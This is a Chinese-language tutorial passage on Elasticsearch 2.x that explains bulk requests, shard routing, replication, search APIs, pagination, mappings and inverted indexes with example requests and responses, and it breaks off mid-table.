<p>也许你正在批量索引日志数据到相同的 index 和 type 中。 但为每一个文档指定相同的元数据是一种浪费。相反，可以像 mget API 一样，在 bulk 请求的 URL 中接收默认的 /_index 或者 /_index/_type ：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /website/_bulk</span><br><span class="line">&#123; "index": &#123; "_type": "log" &#125;&#125;</span><br><span class="line">&#123; "event": "User logged in" &#125;</span><br></pre></td></tr></table></figure></p>
<p>你仍然可以覆盖元数据行中的 _index 和 _type , 但是它将使用 URL 中的这些元数据值作为默认值：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /website/log/_bulk</span><br><span class="line">&#123; "index": &#123;&#125;&#125;</span><br><span class="line">&#123; "event": "User logged in" &#125;</span><br><span class="line">&#123; "index": &#123; "_type": "blog" &#125;&#125;</span><br><span class="line">&#123; "title": "Overriding the default type" &#125;</span><br></pre></td></tr></table></figure></p>
<p>多大是太大了？</p>
<p>整个批量请求都需要由接收到请求的节点加载到内存中，因此该请求越大，其他请求所能获得的内存就越少。 批量请求的大小有一个最佳值，大于这个值，性能将不再提升，甚至会下降。 但是最佳值不是一个固定的值。它完全取决于硬件、文档的大小和复杂度、索引和搜索的负载的整体情况。</p>
<p>幸运的是，很容易找到这个 最佳点 ：通过批量索引典型文档，并不断增加批量大小进行尝试。 当性能开始下降，那么你的批量大小就太大了。一个好的办法是开始时将 1,000 到 5,000 个文档作为一个批次, 如果你的文档非常大，那么就减少批量的文档个数。</p>
<h2 id="分布式文档存储"><a href="#分布式文档存储" class="headerlink" title="分布式文档存储"></a>分布式文档存储</h2><p>在这个章节中，我们将帮助你更好地理解数据如何被存储到这个分布式系统中。</p>
<h2 id="路由一个文档到一个分片中"><a href="#路由一个文档到一个分片中" class="headerlink" title="路由一个文档到一个分片中"></a>路由一个文档到一个分片中</h2><p>当索引一个文档的时候，文档会被存储到一个主分片中。 Elasticsearch 如何知道一个文档应该存放到哪个分片中呢？当我们创建文档时，它如何决定这个文档应当被存储在分片 1 还是分片 2 中呢？</p>
<p>实际上，这个过程是根据下面这个公式决定的：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shard = hash(routing) % number_of_primary_shards</span><br></pre></td></tr></table></figure></p>
<p>routing 是一个可变值，默认是文档的 _id ，也可以设置成一个自定义的值。 routing 通过 hash 函数生成一个数字，然后这个数字再除以 number_of_primary_shards （主分片的数量）后得到 余数 。这个分布在 0 到 number_of_primary_shards-1 之间的余数，就是我们所寻求的文档所在分片的位置。</p>
<p>这就解释了为什么我们要在创建索引的时候就确定好主分片的数量 并且永远不会改变这个数量：因为如果数量变化了，那么所有之前路由的值都会无效，文档也再也找不到了。</p>
<p>所有的文档 API（ get 、 index 、 delete 、 bulk 、 update 以及 mget ）都接受一个叫做 routing 的路由参数 ，通过这个参数我们可以自定义文档到分片的映射。一个自定义的路由参数可以用来确保所有相关的文档——例如所有属于同一个用户的文档——都被存储到同一个分片中。我们也会在扩容设计这一章中详细讨论为什么会有这样一种需求。</p>
<h2 id="主分片和副本分片如何交互"><a href="#主分片和副本分片如何交互" class="headerlink" title="主分片和副本分片如何交互"></a>主分片和副本分片如何交互</h2><p>为了说明目的, 我们 假设有一个集群由三个节点组成。 它包含一个叫 blogs 的索引，有两个主分片，每个主分片有两个副本分片。相同分片的副本不会放在同一节点，所以我们的集群看起来像 图 8所示。</p>
<p>图8 有三个节点和一个索引的集群<br><img src="https://mfaying.github.io/images/elasticsearch2.x/8.jpg" alt="avatar"></p>
<p>我们可以发送请求到集群中的任一节点。 每个节点都有能力处理任意请求。 每个节点都知道集群中任一文档位置，所以可以直接将请求转发到需要的节点上。 在下面的例子中，将所有的请求发送到 Node 1 ，我们将其称为 协调节点(coordinating node) 。</p>
<p>当发送请求的时候， 为了扩展负载，更好的做法是轮询集群中所有的节点。</p>
<h2 id="新建、索引和删除文档"><a href="#新建、索引和删除文档" class="headerlink" title="新建、索引和删除文档"></a>新建、索引和删除文档</h2><p>新建、索引和删除 请求都是 写 操作， 必须在主分片上面完成之后才能被复制到相关的副本分片，如下图所示 图 9所示<br><img src="https://mfaying.github.io/images/elasticsearch2.x/9.jpg" alt="avatar"><br>图 9. 新建、索引和删除单个文档</p>
<p>以下是在主副分片和任何副本分片上面 成功新建，索引和删除文档所需要的步骤顺序：</p>
<p>1.客户端向 Node 1 发送新建、索引或者删除请求。<br>2.节点使用文档的 _id 确定文档属于分片 0 。请求会被转发到 Node 3，因为分片 0 的主分片目前被分配在 Node 3 上。<br>3.Node 3 在主分片上面执行请求。如果成功了，它将请求并行转发到 Node 1 和 Node 2 的副本分片上。一旦所有的副本分片都报告成功, Node 3 将向协调节点报告成功，协调节点向客户端报告成功。</p>
<p>有一些可选的请求参数允许您影响这个过程，可能以数据安全为代价提升性能。这些选项很少使用，因为Elasticsearch已经很快，但是为了完整起见，在这里阐述如下：</p>
<p>consistency</p>
<p>consistency，即一致性。在默认设置下，即使仅仅是在试图执行一个_写_操作之前，主分片都会要求 必须要有 <em>规定数量(quorum)</em>（或者换种说法，也即必须要有大多数）的分片副本处于活跃可用状态，才会去执行_写<em>操作(其中分片副本可以是主分片或者副本分片)。这是为了避免在发生网络分区故障（network partition）的时候进行</em>写<em>操作，进而导致数据不一致。</em>规定数量_即：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int( (primary + number_of_replicas) / 2 ) + 1</span><br></pre></td></tr></table></figure></p>
<p>consistency 参数的值可以设为 one （只要主分片状态 ok 就允许执行_写<em>操作）,all`（必须要主分片和所有副本分片的状态没问题才允许执行</em>写<em>操作）, 或 `quorum 。默认值为 quorum , 即大多数的分片副本状态没问题就允许执行</em>写_操作。</p>
<p>注意，规定数量 的计算公式中 number_of_replicas 指的是在索引设置中的设定副本分片数，而不是指当前处理活动状态的副本分片数。如果你的索引设置中指定了当前索引拥有三个副本分片，那规定数量的计算结果即：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int( (primary + 3 replicas) / 2 ) + 1 = 3</span><br></pre></td></tr></table></figure></p>
<p>如果此时你只启动两个节点，那么处于活跃状态的分片副本数量就达不到规定数量，也因此您将无法索引和删除任何文档。</p>
<p>timeout<br>如果没有足够的副本分片会发生什么？ Elasticsearch会等待，希望更多的分片出现。默认情况下，它最多等待1分钟。 如果你需要，你可以使用 timeout 参数 使它更早终止： 100 100毫秒，30s 是30秒。</p>
<p>注：新索引默认有 1 个副本分片，这意味着为满足 规定数量 应该 需要两个活动的分片副本。 但是，这些默认的设置会阻止我们在单一节点上做任何事情。为了避免这个问题，要求只有当 number_of_replicas 大于1的时候，规定数量才会执行。</p>
<h2 id="取回一个文档-1"><a href="#取回一个文档-1" class="headerlink" title="取回一个文档"></a>取回一个文档</h2><p>可以从主分片或者从其它任意副本分片检索文档 ，如图10所示<br><img src="https://mfaying.github.io/images/elasticsearch2.x/10.jpg" alt="avatar"><br>图 10. 取回单个文档</p>
<p>以下是从主分片或者副本分片检索文档的步骤顺序：<br>1、客户端向 Node 1 发送获取请求。<br>2、节点使用文档的 _id 来确定文档属于分片 0 。分片 0 的副本分片存在于所有的三个节点上。 在这种情况下，它将请求转发到 Node 2 。<br>3、Node 2 将文档返回给 Node 1 ，然后将文档返回给客户端。</p>
<p>在处理读取请求时，协调结点在每次请求的时候都会通过轮询所有的副本分片来达到负载均衡。</p>
<p>在文档被检索时，已经被索引的文档可能已经存在于主分片上但是还没有复制到副本分片。 在这种情况下，副本分片可能会报告文档不存在，但是主分片可能成功返回文档。 一旦索引请求成功返回给用户，文档在主分片和副本分片都是可用的。</p>
<h2 id="局部更新文档"><a href="#局部更新文档" class="headerlink" title="局部更新文档"></a>局部更新文档</h2><p>如图11所示，update API 结合了先前说明的读取和写入模式 。<br><img src="https://mfaying.github.io/images/elasticsearch2.x/11.jpg" alt="avatar"><br>图 11. 局部更新文档</p>
<p>以下是部分更新一个文档的步骤：</p>
<p>1.客户端向 Node 1 发送更新请求。<br>2.它将请求转发到主分片所在的 Node 3 。<br>3.Node 3 从主分片检索文档，修改 _source 字段中的 JSON ，并且尝试重新索引主分片的文档。 如果文档已经被另一个进程修改，它会重试步骤 3 ，超过 retry_on_conflict 次后放弃。<br>4.如果 Node 3 成功地更新文档，它将新版本的文档并行转发到 Node 1 和 Node 2 上的副本分片，重新建立索引。 一旦所有副本分片都返回成功， Node 3 向协调节点也返回成功，协调节点向客户端返回成功。</p>
<p>update API 还接受在 新建、索引和删除文档 章节中介绍的 routing 、 replication 、 consistency 和 timeout 参数。</p>
<p>基于文档的复制</p>
<p>当主分片把更改转发到副本分片时， 它不会转发更新请求。 相反，它转发完整文档的新版本。请记住，这些更改将会异步转发到副本分片，并且不能保证它们以发送它们相同的顺序到达。 如果Elasticsearch仅转发更改请求，则可能以错误的顺序应用更改，导致得到损坏的文档。</p>
<h2 id="多文档模式"><a href="#多文档模式" class="headerlink" title="多文档模式"></a>多文档模式</h2><p>mget 和 bulk API 的 模式类似于单文档模式。区别在于协调节点知道每个文档存在于哪个分片中。 它将整个多文档请求分解成 每个分片 的多文档请求，并且将这些请求并行转发到每个参与节点。</p>
<p>协调节点一旦收到来自每个节点的应答，就将每个节点的响应收集整理成单个响应，返回给客户端，如图12所示。<br><img src="https://mfaying.github.io/images/elasticsearch2.x/12.jpg" alt="avatar"><br>图12. 使用 mget 取回多个文档</p>
<p>以下是使用单个 mget 请求取回多个文档所需的步骤顺序：</p>
<p>1.客户端向 Node 1 发送 mget 请求。<br>2.Node 1 为每个分片构建多文档获取请求，然后并行转发这些请求到托管在每个所需的主分片或者副本分片的节点上。一旦收到所有答复， Node 1 构建响应并将其返回给客户端。</p>
<p>可以对 docs 数组中每个文档设置 routing 参数。</p>
<p>bulk API， 如 图 13 所示， 允许在单个批量请求中执行多个创建、索引、删除和更新请求。<br><img src="https://mfaying.github.io/images/elasticsearch2.x/13.jpg" alt="avatar"><br>图 13. 使用 bulk 修改多个文档</p>
<p>bulk API 按如下步骤顺序执行：</p>
<p>1.客户端向 Node 1 发送 bulk 请求。<br>2.Node 1 为每个节点创建一个批量请求，并将这些请求并行转发到每个包含主分片的节点主机。<br>3.主分片一个接一个按顺序执行每个操作。当每个操作成功时，主分片并行转发新文档（或删除）到副本分片，然后执行下一个操作。 一旦所有的副本分片报告所有操作成功，该节点将向协调节点报告成功，协调节点将这些响应收集整理并返回给客户端。</p>
<p>bulk API 还可以在整个批量请求的最顶层使用 consistency 参数，以及在每个请求中的元数据中使用 routing 参数。</p>
<h2 id="为什么是有趣的格式？"><a href="#为什么是有趣的格式？" class="headerlink" title="为什么是有趣的格式？"></a>为什么是有趣的格式？</h2><p>当我们早些时候在代价较小的批量操作章节了解批量请求时， 您可能会问自己， “为什么 bulk API 需要有换行符的有趣格式，而不是发送包装在 JSON 数组中的请求，例如 mget API？” 。</p>
<p>为了回答这一点，我们需要解释一点背景：在批量请求中引用的每个文档可能属于不同的主分片， 每个文档可能被分配给集群中的任何节点。这意味着批量请求 bulk 中的每个 操作 都需要被转发到正确节点上的正确分片。</p>
<p>如果单个请求被包装在 JSON 数组中，那就意味着我们需要执行以下操作：</p>
<p>1.将 JSON 解析为数组（包括文档数据，可以非常大）<br>2.查看每个请求以确定应该去哪个分片<br>3.为每个分片创建一个请求数组<br>4.将这些数组序列化为内部传输格式<br>5.将请求发送到每个分片</p>
<p>这是可行的，但需要大量的 RAM 来存储原本相同的数据的副本，并将创建更多的数据结构，Java虚拟机（JVM）将不得不花费时间进行垃圾回收。</p>
<p>相反，Elasticsearch可以直接读取被网络缓冲区接收的原始数据。 它使用换行符字符来识别和解析小的 action/metadata 行来决定哪个分片应该处理每个请求。</p>
<p>这些原始请求会被直接转发到正确的分片。没有冗余的数据复制，没有浪费的数据结构。整个请求尽可能在最小的内存中处理。</p>
<h2 id="搜索——最基本的工具"><a href="#搜索——最基本的工具" class="headerlink" title="搜索——最基本的工具"></a>搜索——最基本的工具</h2><p>Elasticsearch 真正强大之处在于可以从无规律的数据中找出有意义的信息——从“大数据”到“大信息”。</p>
<p>Elasticsearch 不只会存储（stores） 文档，为了能被搜索到也会为文档添加索引（indexes） ，这也是为什么我们使用结构化的 JSON 文档，而不是无结构的二进制数据。</p>
<p>文档中的每个字段都将被索引并且可以被查询 。不仅如此，在简单查询时，Elasticsearch 可以使用 所有（all）这些索引字段，以惊人的速度返回结果。这是你永远不会考虑用传统数据库去做的一些事情。</p>
<p>搜索（search） 可以做到：<br>1.在类似于 gender 或者 age 这样的字段 上使用结构化查询，join_date 这样的字段上使用排序，就像SQL的结构化查询一样。<br>2.全文检索，找出所有匹配关键字的文档并按照相关性（relevance） 排序后返回结果。<br>3.以上二者兼而有之。</p>
<p>很多搜索都是开箱即用的，为了充分挖掘 Elasticsearch 的潜力，你需要理解以下三个概念：</p>
<p>1.映射（Mapping） 描述数据在每个字段内如何存储<br>2.分析（Analysis） 全文是如何处理使之可以被搜索的<br>3.领域特定查询语言（Query DSL） Elasticsearch 中强大灵活的查询语言</p>
<h2 id="空搜索"><a href="#空搜索" class="headerlink" title="空搜索"></a>空搜索</h2><p>搜索API的最基础的形式是没有指定任何查询的空搜索 ，它简单地返回集群中所有索引下的所有文档：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br></pre></td></tr></table></figure></p>
<p>返回的结果（为了界面简洁编辑过的）像这样：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"hits"</span> : &#123;</span><br><span class="line">      <span class="attr">"total"</span> :       <span class="number">14</span>,</span><br><span class="line">      <span class="attr">"hits"</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"_index"</span>:   <span class="string">"us"</span>,</span><br><span class="line">          <span class="attr">"_type"</span>:    <span class="string">"tweet"</span>,</span><br><span class="line">          <span class="attr">"_id"</span>:      <span class="string">"7"</span>,</span><br><span class="line">          <span class="attr">"_score"</span>:   <span class="number">1</span>,</span><br><span class="line">          <span class="attr">"_source"</span>: &#123;</span><br><span class="line">             <span class="attr">"date"</span>:    <span class="string">"2014-09-17"</span>,</span><br><span class="line">             <span class="attr">"name"</span>:    <span class="string">"John Smith"</span>,</span><br><span class="line">             <span class="attr">"tweet"</span>:   <span class="string">"The Query DSL is really powerful and flexible"</span>,</span><br><span class="line">             <span class="attr">"user_id"</span>: <span class="number">2</span></span><br><span class="line">          &#125;</span><br><span class="line">       &#125;,</span><br><span class="line">        ... <span class="number">9</span> RESULTS REMOVED ...</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"max_score"</span> :   <span class="number">1</span></span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="attr">"took"</span> :           <span class="number">4</span>,</span><br><span class="line">   <span class="attr">"_shards"</span> : &#123;</span><br><span class="line">      <span class="attr">"failed"</span> :      <span class="number">0</span>,</span><br><span class="line">      <span class="attr">"successful"</span> :  <span class="number">10</span>,</span><br><span class="line">      <span class="attr">"total"</span> :       <span class="number">10</span></span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="attr">"timed_out"</span> :      <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>hits</p>
<p>返回结果中最重要的部分是 hits ，它 包含 total 字段来表示匹配到的文档总数，并且一个 hits 数组包含所查询结果的前十个文档。</p>
<p>在 hits 数组中每个结果包含文档的 _index 、 _type 、 _id ，加上 _source 字段。这意味着我们可以直接从返回的搜索结果中使用整个文档。</p>
<p>每个结果还有一个 _score ，它衡量了文档与查询的匹配程度。默认情况下，首先返回最相关的文档结果，就是说，返回的文档是按照 _score 降序排列的。在这个例子中，我们没有指定任何查询，故所有的文档具有相同的相关性，因此对所有的结果而言 1 是中性的 _score 。</p>
<p>max_score 值是与查询所匹配文档的 _score 的最大值。</p>
<p>took</p>
<p>took值告诉我们执行整个搜索请求耗费了多少毫秒。</p>
<p>shards<br>_shards 部分 告诉我们在查询中参与分片的总数，以及这些分片成功了多少个失败了多少个。正常情况下我们不希望分片失败，但是分片失败是可能发生的。如果我们遭遇到一种灾难级别的故障，在这个故障中丢失了相同分片的原始数据和副本，那么对这个分片将没有可用副本来对搜索请求作出响应。假若这样，Elasticsearch 将报告这个分片是失败的，但是会继续返回剩余分片的结果。</p>
<p>timeout编辑<br>timed_out 值告诉我们查询是否超时。默认情况下，搜索请求不会超时。 如果低响应时间比完成结果更重要，你可以指定 timeout 为 10 或者 10ms（10毫秒），或者 1s（1秒）：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_search?timeout=10ms</span><br></pre></td></tr></table></figure></p>
<p>在请求超时之前，Elasticsearch 将会返回已经成功从每个分片获取的结果。</p>
<p>应当注意的是 timeout 不是停止执行查询，它仅仅是告知正在协调的节点返回到目前为止收集的结果并且关闭连接。在后台，其他的分片可能仍在执行查询即使是结果已经被发送了。</p>
<p>使用超时是因为 SLA(服务等级协议)对你是很重要的，而不是因为想去中止长时间运行的查询。</p>
<h2 id="多索引，多类型"><a href="#多索引，多类型" class="headerlink" title="多索引，多类型"></a>多索引，多类型</h2><p>如果不对某一特殊的索引或者类型做限制，就会搜索集群中的所有文档。Elasticsearch 转发搜索请求到每一个主分片或者副本分片，汇集查询出的前10个结果，并且返回给我们。</p>
<p>然而，经常的情况下，你 想在一个或多个特殊的索引并且在一个或者多个特殊的类型中进行搜索。我们可以通过在URL中指定特殊的索引和类型达到这种效果，如下所示：</p>
<p>/_search<br>   在所有的索引中搜索所有的类型<br>/gb/_search<br>   在 gb 索引中搜索所有的类型<br>/gb,us/_search<br>   在 gb 和 us 索引中搜索所有的文档<br>/g<em>,u</em>/_search<br>   在任何以 g 或者 u 开头的索引中搜索所有的类型<br>/gb/user/_search<br>   在 gb 索引中搜索 user 类型<br>/gb,us/user,tweet/_search<br>   在 gb 和 us 索引中搜索 user 和 tweet 类型<br>/_all/user,tweet/_search<br>   在所有的索引中搜索 user 和 tweet 类型</p>
<p>当在单一的索引下进行搜索的时候，Elasticsearch 转发请求到索引的每个分片中，可以是主分片也可以是副本分片，然后从每个分片中收集结果。多索引搜索恰好也是用相同的方式工作的–只是会涉及到更多的分片。</p>
<p>注：搜索一个索引有五个主分片和搜索五个索引各有一个分片准确来所说是等价的。</p>
<h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><p>和 SQL 使用 LIMIT 关键字返回单个 page 结果的方法相同，Elasticsearch 接受 from 和 size 参数：<br>size<br>   显示应该返回的结果数量，默认是 10<br>from<br>   显示应该跳过的初始结果数量，默认是 0</p>
<p>如果每页展示 5 条结果，可以用下面方式请求得到 1 到 3 页的结果：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_search?size=5</span><br><span class="line">GET /_search?size=5&amp;from=5</span><br><span class="line">GET /_search?size=5&amp;from=10</span><br></pre></td></tr></table></figure></p>
<p>考虑到分页过深以及一次请求太多结果的情况，结果集在返回之前先进行排序。 但请记住一个请求经常跨越多个分片，每个分片都产生自己的排序结果，这些结果需要进行集中排序以保证整体顺序是正确的。</p>
<p>在分布式系统中深度分页</p>
<p>为什么深度分页是有问题的，我们可以假设在一个有 5 个主分片的索引中搜索。 当我们请求结果的第一页（结果从 1 到 10 ），每一个分片产生前 10 的结果，并且返回给 协调节点 ，协调节点对 50 个结果排序得到全部结果的前 10 个。</p>
<p>现在假设我们请求第 1000 页–结果从 10001 到 10010 。所有都以相同的方式工作除了每个分片不得不产生前10010个结果以外。 然后协调节点对全部 50050 个结果排序最后丢弃掉这些结果中的 50040 个结果。</p>
<p>可以看到，在分布式系统中，对结果排序的成本随分页的深度成指数上升。这就是 web 搜索引擎对任何查询都不要返回超过 1000 个结果的原因。</p>
<p>轻量搜索</p>
<p>有两种形式的 搜索 API：一种是 “轻量的” 查询字符串 版本，要求在查询字符串中传递所有的 参数，另一种是更完整的 请求体 版本，要求使用 JSON 格式和更丰富的查询表达式作为搜索语言。</p>
<p>查询字符串搜索非常适用于通过命令行做即席查询。例如，查询在 tweet 类型中 tweet 字段包含 elasticsearch 单词的所有文档：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_all/tweet/_search?q=tweet:elasticsearch</span><br></pre></td></tr></table></figure></p>
<p>下一个查询在 name 字段中包含 john 并且在 tweet 字段中包含 mary 的文档。实际的查询就是这样<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+name:john +tweet:mary</span><br></pre></td></tr></table></figure></p>
<p>但是查询字符串参数所需要的URL编码实际上更加难懂：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_search?q=%2Bname%3Ajohn+%2Btweet%3Amary</span><br></pre></td></tr></table></figure></p>
<p>+前缀表示必须与查询条件匹配。类似地， - 前缀表示一定不与查询条件匹配。没有 + 或者 - 的所有其他条件都是可选的——匹配的越多，文档就越相关。</p>
<p>_all字段</p>
<p>这个简单搜索返回包含 mary 的所有文档：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_search?q=mary</span><br></pre></td></tr></table></figure></p>
<p>之前的例子中，我们在 tweet 和 name 字段中搜索内容。然而，这个查询的结果在三个地方提到了 mary ：</p>
<p>1.有一个用户叫做 Mary<br>2.6条微博发自 Mary<br>3.一条微博直接 @mary</p>
<p>Elasticsearch 是如何在三个不同的字段中查找到结果的呢？</p>
<p>当索引一个文档的时候，Elasticsearch 取出所有字段的值拼接成一个大的字符串，作为 _all 字段进行索引。例如，当索引这个文档时：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"tweet"</span>:    <span class="string">"However did I manage before Elasticsearch?"</span>,</span><br><span class="line">    <span class="attr">"date"</span>:     <span class="string">"2014-09-14"</span>,</span><br><span class="line">    <span class="attr">"name"</span>:     <span class="string">"Mary Jones"</span>,</span><br><span class="line">    <span class="attr">"user_id"</span>:  <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这就好似增加了一个名叫 _all 的额外字段：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;However did I manage before Elasticsearch? 2014-09-14 Mary Jones 1&quot;</span><br></pre></td></tr></table></figure></p>
<p>除非设置特定字段，否则查询字符串就使用 _all 字段进行搜索。</p>
<p>在刚开始开发一个应用时，_all 字段是一个很实用的特性。之后，你会发现如果搜索时用指定字段来代替 _all 字段，将会更好控制搜索结果。当 _all 字段不再有用的时候，可以将它置为失效，正如在 元数据: _all 字段 中所解释的。</p>
<p>更复杂的查询</p>
<p>下面的查询针对tweents类型，并使用以下的条件：</p>
<p>1.name 字段中包含 mary 或者 john<br>2.date 值大于 2014-09-10<br>3._all 字段包含 aggregations 或者 geo</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+name:(mary john) +date:&gt;2014-09-10 +(aggregations geo)</span><br></pre></td></tr></table></figure>
<p>查询字符串在做了适当的编码后，可读性很差：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?q=%2Bname%3A(mary+john)+%2Bdate%3A%3E2014-09-10+%2B(aggregations+geo)</span><br></pre></td></tr></table></figure></p>
<p>这种 轻量 的查询字符串对于通过命令做一次性查询，或者是在开发阶段，都非常方便。但同时也可以看到，这种精简让调试更加晦涩和困难。而且很脆弱，一些查询字符串中很小的语法错误，像 - ， : ， / 或者 “ 不匹配等，将会返回错误而不是搜索结果。</p>
<p>最后，查询字符串搜索允许任何用户在索引的任意字段上执行可能较慢且重量级的查询，这可能会暴露隐私信息，甚至将集群拖垮。</p>
<p>相反，我们经常在生产环境中更多地使用功能全面的 request body 查询API，除了能完成以上所有功能，还有一些附加功能。</p>
<h2 id="映射和分析"><a href="#映射和分析" class="headerlink" title="映射和分析"></a>映射和分析</h2><p>当摆弄索引里面的数据时，我们发现一些奇怪的事情。一些事情看起来被打乱了：在我们的索引中有12条推文，其中只有一条包含日期 2014-09-15 ，但是看一看下面查询命中的 总数 （total）：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_search?q=2014              # 12 results</span><br><span class="line">GET /_search?q=2014-09-15        # 12 results !</span><br><span class="line">GET /_search?q=date:2014-09-15   # 1  result</span><br><span class="line">GET /_search?q=date:2014         # 0  results !</span><br></pre></td></tr></table></figure></p>
<p>为什么在 _all 字段查询日期返回所有推文，而在 date 字段只查询年份却没有返回结果？为什么我们在 _all 字段和 date 字段的查询结果有差别？</p>
<p>推测起来，这是因为数据在 <em>all 字段与 date 字段的索引方式不同。所以，通过请求 gb 索引中 tweet 类型的</em>映射_（或模式定义），让我们看一看 Elasticsearch 是如何解释我们文档结构的：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /gb/_mapping/tweet</span><br></pre></td></tr></table></figure></p>
<p>这将得到如下结果：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"gb"</span>: &#123;</span><br><span class="line">      <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">         <span class="attr">"tweet"</span>: &#123;</span><br><span class="line">            <span class="attr">"properties"</span>: &#123;</span><br><span class="line">               <span class="attr">"date"</span>: &#123;</span><br><span class="line">                  <span class="attr">"type"</span>: <span class="string">"date"</span>,</span><br><span class="line">                  <span class="attr">"format"</span>: <span class="string">"strict_date_optional_time||epoch_millis"</span></span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="attr">"name"</span>: &#123;</span><br><span class="line">                  <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="attr">"tweet"</span>: &#123;</span><br><span class="line">                  <span class="attr">"type"</span>: <span class="string">"string"</span></span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="attr">"user_id"</span>: &#123;</span><br><span class="line">                  <span class="attr">"type"</span>: <span class="string">"long"</span></span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>基于对字段类型的猜测， Elasticsearch 动态为我们产生了一个映射。这个响应告诉我们 date 字段被认为是 date 类型的。由于 _all 是默认字段，所以没有提及它。但是我们知道 _all 字段是 string 类型的。</p>
<p>所以 date 字段和 string 字段 索引方式不同，因此搜索结果也不一样。这完全不令人吃惊。你可能会认为 核心数据类型 strings、numbers、Booleans 和 dates 的索引方式有稍许不同。没错，他们确实稍有不同。</p>
<p>但是，到目前为止，最大的差异在于 代表 精确值 （它包括 string 字段）的字段和代表 全文 的字段。这个区别非常重要——它将搜索引擎和所有其他数据库区别开来。</p>
<h2 id="精确值-VS-全文"><a href="#精确值-VS-全文" class="headerlink" title="精确值 VS 全文"></a>精确值 VS 全文</h2><p>Elasticsearch 中的数据可以概括的分为两类：精确值和全文。</p>
<p>精确值 如它们听起来那样精确。例如日期或者用户 ID，但字符串也可以表示精确值，例如用户名或邮箱地址。对于精确值来讲，Foo 和 foo 是不同的，2014 和 2014-09-15 也是不同的。</p>
<p>另一方面，全文是指文本数据（通常以人类容易识别的语言书写），例如一个推文的内容或一封邮件的内容。全文通常是指非结构化的数据，但这里有一个误解：自然语言是高度结构化的。问题在于自然语言的规则是复杂的，导致计算机难以正确解析。例如，考虑这条语句:May is fun but June bores me.它指的是月份还是人？</p>
<p>精确值很容易查询。结果是二进制的：要么匹配查询，要么不匹配。这种查询很容易用 SQL 表示：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">WHERE name    = "John Smith"</span><br><span class="line">  AND user_id = 2</span><br><span class="line">  AND date    &gt; "2014-09-15"</span><br></pre></td></tr></table></figure>
<p>查询全文数据要微妙的多。我们问的不只是“这个文档匹配查询吗”，而是“该文档匹配查询的程度有多大？”换句话说，该文档与给定查询的相关性如何？</p>
<p>我们很少对全文类型的域做精确匹配。相反，我们希望在文本类型的域中搜索。不仅如此，我们还希望搜索能够理解我们的 意图 ：</p>
<p>1.搜索 UK ，会返回包含 United Kindom 的文档。<br>2.搜索 jump ，会匹配 jumped ， jumps ， jumping ，甚至是 leap 。<br>3.搜索 johnny walker 会匹配 Johnnie Walker ， johnnie depp 应该匹配 Johnny Depp 。<br>4.fox news hunting 应该返回福克斯新闻（ Foxs News ）中关于狩猎的故事，同时， fox hunting news 应该返回关于猎狐的故事。</p>
<p>为了促进这类在全文域中的查询，Elasticsearch 首先 分析 文档，之后根据结果创建 倒排索引。</p>
<h2 id="倒排索引"><a href="#倒排索引" class="headerlink" title="倒排索引"></a>倒排索引</h2><p>Elasticsearch 使用一种称为 倒排索引 的结构，它适用于快速的全文搜索。一个倒排索引由文档中所有不重复词的列表构成，对于其中每个词，有一个包含它的文档列表。</p>
<p>例如，假设我们有两个文档，每个文档的 content 域包含如下内容：</p>
<p>1.The quick brown fox jumped over the lazy dog<br>2.Quick brown foxes leap over lazy dogs in summer</p>
<p>为了创建倒排索引，我们首先将每个文档的 content 域拆分成单独的 词（我们称它为 词条 或 tokens ），创建一个包含所有不重复词条的排序列表，然后列出每个词条出现在哪个文档。结果如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Term      Doc_1  Doc_2</span><br><span class="line">-------------------------</span><br><span class="line">Quick   |       |  X</span><br><span class="line">The     |   X   |</span><br><span class="line">brown   |   X   |  X</span><br><span class="line">dog     |   X   |</span><br><span class="line">dogs    |       |  X</span><br><span class="line">fox     |   X   |</span><br><span class="line">foxes   |       |  X</span><br><span class="line">in      |       |  X</span><br><span class="line">jumped  |   X   |</span><br><span class="line">lazy    |   X   |  X</span><br><span class="line">leap    |       |  X</span><br><span class="line">over    |   X   |  X</span><br><span class="line">quick   |   X   |</span><br><span class="line">summer  |       |  X</span><br><span class="line">the    